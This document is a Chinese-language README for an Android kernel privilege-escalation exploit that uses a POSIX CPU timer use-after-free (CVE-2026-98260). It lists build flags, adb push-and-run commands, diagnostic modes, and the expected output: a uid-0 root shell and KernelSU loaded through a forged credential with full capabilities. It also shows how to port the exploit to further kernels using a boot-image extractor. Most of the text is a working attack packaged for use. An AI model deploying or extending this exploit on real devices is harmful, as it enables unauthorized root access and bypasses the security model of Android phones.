# CVE-2026-98260 Timer LPE

`6.12.69-android16-6-g242e1a07f878` 的 CVE-2026-98260 POSIX CPU timer UAF 移植

两条链：

- `timer`：真实 cred 零写 → `uid=0`、`u:r:shell:s0`（shell 域 root，bset caps）
- `timer fake`：fake cred（full caps）→ 安装版 KernelSU `libksud.so` late-load

## 状态

| 路径                                     | 结果                                                              |
| ---------------------------------------- | ----------------------------------------------------------------- |
| real cred 零写 + `setuid(0)` + `exec sh` | `uid=0`、`u:r:shell:s0`、`ROOT_SHELL_OK`                          |
| fake cred + `ksud late-load`             | 安装版 `libksud.so`（uapi 6）、`KSU_LOADED`、`su` 为 `u:r:ksu:s0` |

## 环境

- 启动身份：adb/shell（uid 2000，`u:r:shell:s0`），可读 tracefs 与 `/proc/slabinfo`
- KernelSU manager 已安装（`me.weishu.kernelsu`）时，`fake` 会自动使用其 `lib/arm64/libksud.so`

## 构建

```sh
cd timer
NDK=~/Android/Sdk/ndk/30.0.16248370/toolchains/llvm/prebuilt/linux-x86_64/bin
$NDK/aarch64-linux-android35-clang -O2 -std=gnu11 -static \
    -fno-stack-protector -fno-pic -I. \
    -ffunction-sections -fdata-sections timer.c -o timer \
    -Wl,--gc-sections -Wl,-s -Wl,--build-id=none \
    -Wl,-z,norelro -pthread
```

## 内核支持

不同内核各自一个 `timer/kbuilds/<release>.h`，由 `timer/kbuilds.h` 索引；`timer` 按 `uname -r` 整串匹配

```sh
cargo build --release --manifest-path tools/extract/Cargo.toml
tools/extract/target/release/timer-extract boot.img --add   # 检测 98260 + 写入并登记 profile
```

## 使用

```sh
adb push timer /data/local/tmp/timer
adb shell chmod 755 /data/local/tmp/timer

# 诊断
adb shell /data/local/tmp/timer build   # 打印内核 release 与命中的 profile
adb shell /data/local/tmp/timer ids     # 探测 tracefs page event id
adb shell /data/local/tmp/timer leak    # 只做 base/cred/task 泄漏，不触发 UAF

# uid-0 shell（真实 cred）
adb shell /data/local/tmp/timer         # id + context + ROOT_SHELL_OK
adb shell /data/local/tmp/timer shell   # 交互 sh

# KernelSU（fake cred + 安装版 ksud）
adb shell 'cd /data/local/tmp && setsid ./timer fake >timer.log 2>&1 </dev/null &'
adb shell cat /data/local/tmp/timer.log
```

`fake` 成功标志：

```text
[ksu] ksud=.../lib/arm64/libksud.so version=ksud 3.3.1-24-g528bafc5 (uapi: 6)
KSU_LOADED
kernelsu ... Live
```

```sh
adb shell /system/bin/su -c id   # uid=0 ... context=u:r:ksu:s0
```

## 安全

- 失败 state 会 **park 并持有 zombie**；不要 kill，重启是唯一安全清理
- 触发 UAF 后不要对 parked 进程 `timeout`/`kill`，否则可能 panic
- 使用 KernelSU 模拟软重启能正常保留越狱状态，硬重启后 root 正常消失

## 目录

```text
timer/timer.c      exploit
timer/kbuilds.h    内核 profile 索引（include 列表 + 指针表）
timer/kbuilds/     各内核的 profile（<release>.h）
timer/timer        静态产物
tools/*.c          移植诊断源码
tools/extract/     提取器与检测（Rust，bin timer-extract）
```

## 移植

per-build 常量在 `timer/kbuilds/<release>.h`，`timer.c` 只含逻辑；添加内核：

```sh
tools/extract/target/release/timer-extract <boot.img> --add
```

`tools/*.c` 用于核对 call site、raw record、timer 泄漏与 8 KiB AF_UNIX 回收通道。

## 参考

- `woshigenm/CVE-2026-98260`：trigger 与 cred 思路
- `ghostlock-app`：KernelSU late-load；`tools/extract_rs` 提取器
- 其他 CVE-2026-98260 移植项目：order-1 回收与时序
